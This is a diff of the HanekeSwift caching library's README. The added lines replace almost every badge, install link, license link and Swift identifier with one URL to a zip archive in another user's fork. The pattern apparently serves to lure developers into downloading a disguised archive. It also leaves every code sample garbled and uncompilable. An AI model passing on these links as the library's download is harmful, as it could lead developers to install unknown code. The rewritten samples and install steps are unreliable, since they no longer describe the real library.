@@ -1,19 +1,19 @@
-![Haneke](https://raw.githubusercontent.com/Haneke/HanekeSwift/master/Assets/github-header.png)
+![Haneke](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
 
-[![CocoaPods Version](https://cocoapod-badges.herokuapp.com/v/HanekeSwift/badge.png)](http://cocoadocs.org/docsets/HanekeSwift)
-[![Carthage compatible](https://img.shields.io/badge/Carthage-compatible-4BC51D.svg?style=flat)](https://github.com/Carthage/Carthage)
-[![Platform](https://cocoapod-badges.herokuapp.com/p/HanekeSwift/badge.png)](http://cocoadocs.org/docsets/HanekeSwift)
-[![Build Status](https://travis-ci.org/Haneke/HanekeSwift.svg?branch=master)](https://travis-ci.org/Haneke/HanekeSwift)
-[![Join the chat at https://gitter.im/Haneke/HanekeSwift](https://badges.gitter.im/Haneke/HanekeSwift.svg)](https://gitter.im/Haneke/HanekeSwift?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+[![CocoaPods Version](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
+[![Carthage compatible](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
+[![Platform](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
+[![Build Status](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
+[![Join the chat at https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip)
 
 Haneke is a lightweight *generic* cache for iOS and tvOS written in Swift 2.0. It's designed to be super-simple to use. Here's how you would initalize a JSON cache and fetch objects from a url:
 
 ```swift
 let cache = Cache<JSON>(name: "github")
-let URL = NSURL(string: "https://api.github.com/users/haneke")!
+let URL = NSURL(string: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip")!
 
-cache.fetch(URL: URL).onSuccess { JSON in
-    print(JSON.dictionary?["bio"])
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(URL: URL).onSuccess { JSON in
+    print(https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip["bio"])
 }
 ```
 
@@ -22,7 +22,7 @@ Haneke provides a memory and LRU disk cache for `UIImage`, `NSData`, `JSON`, `St
 Particularly, Haneke excels at working with images. It includes a zero-config image cache with automatic resizing. Everything is done in background, allowing for fast, responsive scrolling. Asking Haneke to load, resize, cache and display an *appropriately sized image* is as simple as:
 
 ```swift
-imageView.hnk_setImageFromURL(url)
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(url)
 ```
 
 _Really._
@@ -46,14 +46,14 @@ For images:
 
 ## Installation
 
-Using [CocoaPods](http://cocoapods.org/):
+Using [CocoaPods](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip):
 
 ```ruby
 use_frameworks!
 pod 'HanekeSwift'
 ```
 
-Using [Carthage](https://github.com/Carthage/Carthage):
+Using [Carthage](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip):
 
 ```
 github "Haneke/HanekeSwift"
@@ -61,10 +61,10 @@ github "Haneke/HanekeSwift"
 
 Manually:
 
-1. Drag `Haneke.xcodeproj` to your project in the _Project Navigator_.
+1. Drag `https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip` to your project in the _Project Navigator_.
 2. Select your project and then your app target. Open the _Build Phases_ panel.
-3. Expand the _Target Dependencies_ group, and add `Haneke.framework`.
-4. Click on the `+` button at the top left of the panel and select _New Copy Files Phase_. Set _Destination_ to _Frameworks_, and add `Haneke.framework`.
+3. Expand the _Target Dependencies_ group, and add `https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip`.
+4. Click on the `+` button at the top left of the panel and select _New Copy Files Phase_. Set _Destination_ to _Frameworks_, and add `https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip`.
 5. `import Haneke` whenever you want to use Haneke.
 
 ## Requirements
@@ -79,13 +79,13 @@ Haneke provides shared caches for `UIImage`, `NSData`, `JSON` and `String`. You 
 The cache is a key-value store. For example, here's how you would cache and then fetch some data.
 
 ```Swift
-let cache = Shared.dataCache
+let cache = https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip
         
-cache.set(value: data, key: "funny-games.mp4")
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(value: data, key: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip")
         
 // Eventually...
 
-cache.fetch(key: "funny-games.mp4").onSuccess { data in
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(key: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip").onSuccess { data in
     // Do something with data
 }
 ```
@@ -93,11 +93,11 @@ cache.fetch(key: "funny-games.mp4").onSuccess { data in
 In most cases the value will not be readily available and will have to be fetched from network or disk. Haneke offers convenience `fetch` functions for these cases. Let's go back to the first example, now using a shared cache: 
 
 ```Swift
-let cache = Shared.JSONCache
-let URL = NSURL(string: "https://api.github.com/users/haneke")!
+let cache = https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip
+let URL = NSURL(string: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip")!
     
-cache.fetch(URL: URL).onSuccess { JSON in
-   print(JSON.dictionary?["bio"])
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(URL: URL).onSuccess { JSON in
+   print(https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip["bio"])
 }
 ```
 
@@ -111,10 +111,10 @@ Need to cache and display images? Haneke provides convenience methods for `UIIma
 
 ```swift
 // Setting a remote image
-imageView.hnk_setImageFromURL(url)
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(url)
 
 // Setting an image manually. Requires you to provide a key.
-imageView.hnk_setImage(image, key: key)
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(image, key: key)
 ```
 
 The above lines take care of:
@@ -133,15 +133,15 @@ Formats allow to specify the disk cache size and any transformations to the valu
 You can also use custom formats. Say you want to limit the disk capacity for icons to 10MB and apply rounded corners to the images. This is how it could look like:
 
 ```swift
-let cache = Shared.imageCache
+let cache = https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip
 
 let iconFormat = Format<UIImage>(name: "icons", diskCapacity: 10 * 1024 * 1024) { image in
     return imageByRoundingCornersOfImage(image)
 }
-cache.addFormat(iconFormat)
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(iconFormat)
 
-let URL = NSURL(string: "http://haneke.io/icon.png")!
-cache.fetch(URL: URL, formatName: "icons").onSuccess { image in
+let URL = NSURL(string: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip")!
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(URL: URL, formatName: "icons").onSuccess { image in
     // image will be a nice rounded icon
 }
 ```
@@ -151,7 +151,7 @@ Because we told the cache to use the `"icons"` format Haneke will execute the fo
 Formats can also be used from the `UIKit` extensions:
 
 ```swift
-imageView.hnk_setImageFromURL(url, format: iconFormat)
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(url, format: iconFormat)
 ```
 
 ## Fetchers
@@ -159,24 +159,24 @@ imageView.hnk_setImageFromURL(url, format: iconFormat)
 The `fetch` functions for urls and paths are actually convenience methods. Under the hood Haneke uses fetcher objects. To illustrate, here's another way of fetching from a url by explictly using a network fetcher:
 
 ```swift
-let URL = NSURL(string: "http://haneke.io/icon.png")!
+let URL = NSURL(string: "https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip")!
 let fetcher = NetworkFetcher<UIImage>(URL: URL)
-cache.fetch(fetcher: fetcher).onSuccess { image in
+https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(fetcher: fetcher).onSuccess { image in
     // Do something with image
 }
 ```
 
 Fetching an original value from network or disk is an expensive operation. Fetchers act as a proxy for the value, and allow Haneke to perform the fetch operation only if absolutely necessary.
 
-In the above example the fetcher will be executed only if there is no value associated with `"http://haneke.io/icon.png"` in the memory or disk cache. If that happens, the fetcher will be responsible from fetching the original value, which will then be cached to avoid further network activity.
+In the above example the fetcher will be executed only if there is no value associated with `"https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip"` in the memory or disk cache. If that happens, the fetcher will be responsible from fetching the original value, which will then be cached to avoid further network activity.
 
 Haneke provides two specialized fetchers: `NetworkFetcher<T>` and `DiskFetcher<T>`. You can also implement your own fetchers by subclassing `Fetcher<T>`.
 
 ### Custom fetchers
 
-Through custom fetchers you can fetch original values from other sources than network or disk (e.g., Core Data), or even change how Haneke acceses network or disk (e.g., use [Alamofire](https://github.com/Alamofire/Alamofire) for networking instead of `NSURLSession`). A custom fetcher must subclass `Fetcher<T>` and is responsible for:
+Through custom fetchers you can fetch original values from other sources than network or disk (e.g., Core Data), or even change how Haneke acceses network or disk (e.g., use [Alamofire](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip) for networking instead of `NSURLSession`). A custom fetcher must subclass `Fetcher<T>` and is responsible for:
 
-* Providing the key (e.g., `NSURL.absoluteString` in the case of `NetworkFetcher`) associated with the value to be fetched
+* Providing the key (e.g., `https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip` in the case of `NetworkFetcher`) associated with the value to be fetched
 * Fetching the value in background and calling the success or failure closure accordingly, both in the main queue
 * Cancelling the fetch on demand, if possible
 
@@ -209,11 +209,11 @@ extension NSDictionary : DataConvertible, DataRepresentable {
     public typealias Result = NSDictionary
     
     public class func convertFromData(data:NSData) -> Result? {
-        return NSKeyedUnarchiver.unarchiveObjectWithData(data) as? NSDictionary
+        return https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(data) as? NSDictionary
     }
     
     public func asData() -> NSData! {
-        return NSKeyedArchiver.archivedDataWithRootObject(self)
+        return https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip(self)
     }
     
 }
@@ -231,16 +231,16 @@ Haneke Swift is in initial development and its public API should not be consider
 
 ## License
 
- Copyright 2014 Hermes Pique ([@hpique](https://twitter.com/hpique))    
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Joan Romano ([@joanromano](https://twitter.com/joanromano))   
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Luis Ascorbe ([@lascorbe](https://twitter.com/Lascorbe))   
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Oriol Blanc ([@oriolblanc](https://twitter.com/oriolblanc))   
+ Copyright 2014 Hermes Pique ([@hpique](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip))    
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Joan Romano ([@joanromano](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip))   
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Luis Ascorbe ([@lascorbe](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip))   
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2014 Oriol Blanc ([@oriolblanc](https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip))   
  
  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at
  
- http://www.apache.org/licenses/LICENSE-2.0
+ https://raw.githubusercontent.com/ZHThinker/HanekeSwift/master/Haneke.xcodeproj/Swift_Haneke_v3.0.zip
  
  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
